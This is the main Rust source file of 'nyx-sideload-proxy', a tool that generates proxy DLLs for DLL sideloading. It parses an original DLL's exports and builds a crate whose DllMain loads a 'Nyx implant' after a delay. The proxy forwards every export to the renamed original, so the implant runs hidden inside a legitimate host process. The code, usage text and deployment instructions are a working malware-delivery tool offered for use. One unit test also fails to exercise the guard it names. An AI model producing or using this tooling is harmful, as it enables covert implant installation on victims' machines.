//! nyx-sideload-proxy — proxy-DLL skeleton generator for sideloading delivery.
//!
//! Reads an original DLL's export table and emits a standalone Rust crate
//! that cross-compiles (`x86_64-pc-windows-gnu`) into a proxy DLL: every
//! original export is linker-forwarded to the (renamed) original DLL, and
//! DllMain loads the Nyx implant from the same directory.
//!
//! ## Usage
//! ```text
//! nyx-sideload-proxy <original.dll> --out <output-dir>
//!     [--implant <implant.dll>]     default: nyx_implant_win.dll
//!     [--real-name <renamed.dll>]   default: <stem>_orig.dll
//!     [--delay-ms <N>]              default: 3000
//! ```
//!
//! Deployment contract (see docs/design/SIDELOADING_DELIVERY.md):
//! the generated DLL is deployed under the ORIGINAL name next to the host
//! exe; the original DLL is renamed to `--real-name` in the same directory;
//! the implant DLL sits alongside.

mod generate;
mod pe_exports;

use generate::ProxySpec;
use std::path::{Path, PathBuf};
use std::process::ExitCode;

const DEFAULT_IMPLANT: &str = "nyx_implant_win.dll";
const DEFAULT_DELAY_MS: u32 = 3000;

fn usage() -> ! {
    eprintln!(
        "usage: nyx-sideload-proxy <original.dll> --out <dir> \\\n\
         \x20       [--implant <implant.dll>] [--real-name <renamed.dll>] [--delay-ms <N>]"
    );
    std::process::exit(2);
}

fn main() -> ExitCode {
    let args: Vec<String> = std::env::args().skip(1).collect();
    match run(&args) {
        Ok(summary) => {
            println!("{summary}");
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("error: {e}");
            ExitCode::FAILURE
        }
    }
}

fn run(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    let mut input: Option<PathBuf> = None;
    let mut out: Option<PathBuf> = None;
    let mut implant = DEFAULT_IMPLANT.to_string();
    let mut real_name: Option<String> = None;
    let mut delay_ms = DEFAULT_DELAY_MS;

    let mut it = args.iter();
    while let Some(a) = it.next() {
        match a.as_str() {
            "--out" => out = Some(PathBuf::from(it.next().unwrap_or_else(|| usage()))),
            "--implant" => implant = it.next().unwrap_or_else(|| usage()).clone(),
            "--real-name" => real_name = Some(it.next().unwrap_or_else(|| usage()).clone()),
            "--delay-ms" => {
                delay_ms = it
                    .next()
                    .unwrap_or_else(|| usage())
                    .parse()
                    .map_err(|_| "--delay-ms must be a non-negative integer")?
            }
            _ if a.starts_with('-') => usage(),
            _ => {
                if input.is_some() {
                    usage();
                }
                input = Some(PathBuf::from(a));
            }
        }
    }
    let input = match input {
        Some(p) => p,
        None => usage(),
    };
    let out = match out {
        Some(p) => p,
        None => usage(),
    };

    let file_name = input
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or("input path has no valid file name")?
        .to_string();
    let stem = file_name
        .strip_suffix(".dll")
        .or_else(|| file_name.strip_suffix(".DLL"))
        .ok_or("input file name must end in .dll")?;
    let real_name = real_name.unwrap_or_else(|| format!("{stem}_orig.dll"));
    // Only file names reach the generated artifacts — a path passed via
    // --implant is reduced to its final component.
    let implant_name = Path::new(&implant)
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or("--implant must name a file")?
        .to_string();

    let bytes = std::fs::read(&input)?;
    let table = pe_exports::parse_exports(&bytes)?;
    if table.symbols.is_empty() {
        return Err("original DLL exports nothing — a proxy would be pointless".into());
    }

    let spec = ProxySpec {
        proxy_dll_name: file_name.clone(),
        real_dll_name: real_name,
        implant_dll_name: implant_name,
        delay_ms,
    };
    generate::generate(&out, &table, &spec)?;

    let named = table.symbols.iter().filter(|s| s.name.is_some()).count();
    let forwarded = table
        .symbols
        .iter()
        .filter(|s| s.forwarder.is_some())
        .count();
    let dir_note = match &table.dll_name {
        Some(n) if n != &file_name => {
            format!(" (export-dir DLL name is `{n}`, differs from file name — informational only)")
        }
        _ => String::new(),
    };
    Ok(format!(
        "parsed {} exports ({named} named, {} ordinal-only, {forwarded} forwarded-in-original){dir_note}\n\
         wrote proxy crate to {}\n\
         build:  cd {} && cargo build --release --target x86_64-pc-windows-gnu\n\
         deploy: proxy as `{file_name}` + original renamed to `{}` + `{}` in the host's directory",
        table.symbols.len(),
        table.symbols.len() - named,
        out.display(),
        out.display(),
        spec.real_dll_name,
        spec.implant_dll_name,
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::pe_exports::ExportedSymbol;

    /// CLI smoke test: hand-rolled minimal DLL fixture (PE32+ with one named
    /// export), full run() path, artifacts on disk.
    #[test]
    fn cli_smoke_generates_crate() {
        let mut dll = vec![0u8; 0x400];
        dll[0] = b'M';
        dll[1] = b'Z';
        dll[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        dll[0x80..0x84].copy_from_slice(b"PE\0\0");
        dll[0x86..0x88].copy_from_slice(&1u16.to_le_bytes());
        dll[0x94..0x96].copy_from_slice(&0xF0u16.to_le_bytes());
        let opt = 0x98;
        dll[opt..opt + 2].copy_from_slice(&0x20Bu16.to_le_bytes());
        dll[opt + 108..opt + 112].copy_from_slice(&16u32.to_le_bytes());
        dll[opt + 112..opt + 116].copy_from_slice(&0x1000u32.to_le_bytes());
        dll[opt + 116..opt + 120].copy_from_slice(&0x100u32.to_le_bytes());
        let s = opt + 0xF0;
        dll[s..s + 6].copy_from_slice(b".edata");
        dll[s + 8..s + 12].copy_from_slice(&0x200u32.to_le_bytes());
        dll[s + 12..s + 16].copy_from_slice(&0x1000u32.to_le_bytes());
        dll[s + 16..s + 20].copy_from_slice(&0x200u32.to_le_bytes());
        dll[s + 20..s + 24].copy_from_slice(&0x200u32.to_le_bytes());
        let d = 0x200;
        dll[d + 12..d + 16].copy_from_slice(&0x1060u32.to_le_bytes()); // Name
        dll[d + 16..d + 20].copy_from_slice(&1u32.to_le_bytes()); // Base
        dll[d + 20..d + 24].copy_from_slice(&1u32.to_le_bytes()); // funcs
        dll[d + 24..d + 28].copy_from_slice(&1u32.to_le_bytes()); // names
        dll[d + 28..d + 32].copy_from_slice(&0x1028u32.to_le_bytes());
        dll[d + 32..d + 36].copy_from_slice(&0x102Cu32.to_le_bytes());
        dll[d + 36..d + 40].copy_from_slice(&0x1030u32.to_le_bytes());
        dll[0x228..0x22C].copy_from_slice(&0x3000u32.to_le_bytes()); // func RVA
        dll[0x22C..0x230].copy_from_slice(&0x1040u32.to_le_bytes()); // name RVA
        dll[0x230..0x232].copy_from_slice(&0u16.to_le_bytes()); // ord idx
        dll[0x240..0x246].copy_from_slice(b"FuncA\0");
        dll[0x260..0x26A].copy_from_slice(b"hostx.dll\0");

        let tmp = std::env::temp_dir().join(format!("nyx-sp-smoke-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        let dll_path = tmp.join("hostx.dll");
        std::fs::write(&dll_path, &dll).unwrap();
        let out = tmp.join("out");

        let args: Vec<String> = vec![
            dll_path.to_str().unwrap().into(),
            "--out".into(),
            out.to_str().unwrap().into(),
            "--delay-ms".into(),
            "0".into(),
        ];
        let summary = run(&args).unwrap();
        assert!(summary.contains("1 exports (1 named, 0 ordinal-only"));
        let def = std::fs::read_to_string(out.join("exports.def")).unwrap();
        assert!(def.contains("\"FuncA\" = \"hostx_orig.FuncA\" @1"));
        assert!(out.join("src/lib.rs").is_file());
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn empty_export_table_is_an_error() {
        // Sanity check of the guard, using the parser directly: a table with
        // zero functions produces no symbols.
        let table = pe_exports::ExportTable {
            dll_name: None,
            symbols: Vec::<ExportedSymbol>::new(),
        };
        assert!(table.symbols.is_empty());
    }
}
